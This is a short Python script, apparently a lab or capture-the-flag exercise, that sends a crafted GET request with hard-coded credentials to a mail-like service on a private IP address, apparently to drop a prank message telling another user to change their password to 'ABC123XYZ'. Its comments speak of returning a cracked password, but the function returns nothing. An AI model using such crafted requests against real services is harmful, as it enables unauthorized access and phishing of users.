import sys
import requests
import random


def custom_url_string(original):
    res = ""
    for c in original:
        lol = ord(c)
        res += "{}-".format(lol)
    return res[:-1]

# If succesful, returns the cracked password.
# If unsuccessful, returns None.
def shoot_custom_request(username, password):
    un = custom_url_string(username)
    pw = custom_url_string(password)
    test_message = '{"from": "sit","subject": "CHANGE YOUR PASSWORD YOU FOOL","date": "Sun Oct 22 2017 22:14:12 GMT-0400 (EDT)","body": "PLEASE CHANGE YOUR PASSWORD TO ABC123XYZ OR ELSE YOU WILL GET HACKED BY THE RUDE BOYES"}//END_MSG//'
    print(len(test_message))
    url = "http://{}:{}/$0000000000?pw={}&un={}&msg={}-0-0-0-0-0-0-0-0%to={}.inbox".format(
            "192.168.26.3", 
            "8080", 
            pw, 
            un,
            custom_url_string(test_message),
            custom_url_string('inhibitor')
    )        
    headers = {"Referer": "http://{}:{}/".format("192.168.26.3", "8080")}
    r = requests.get(url, headers=headers)
    print(url)
    print(r)
    print(r.status_code)
    print(r.content)

# Do NOT change anything below (unless you are using Python 2, in which case
# only fix the print statement syntax).

def main():
    shoot_custom_request('sit', 'albert')

if __name__ == '__main__':
    main()
